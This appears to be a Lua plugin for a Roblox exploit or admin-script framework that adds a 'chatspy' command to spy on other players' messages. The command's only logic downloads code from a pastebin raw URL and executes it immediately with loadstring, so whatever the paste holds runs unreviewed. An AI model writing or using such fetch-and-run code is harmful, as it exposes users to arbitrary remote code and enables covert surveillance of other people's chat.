local Plugin = {
	["PluginName"] = "Chat Spy",
	["PluginDescription"] = "Spy on Messages",
	["Commands"] = {
		["chatspy"] = {
			["ListName"] = "chatspy",
			["Description"] = "Spy on Messages",
			["Aliases"] = {},
			["Function"] = function(args, speaker)
				loadstring(game:HttpGetAsync("https://pastebin.com/raw/fQ54xXEn"))()
			end,
		},
	},
}
return Plugin
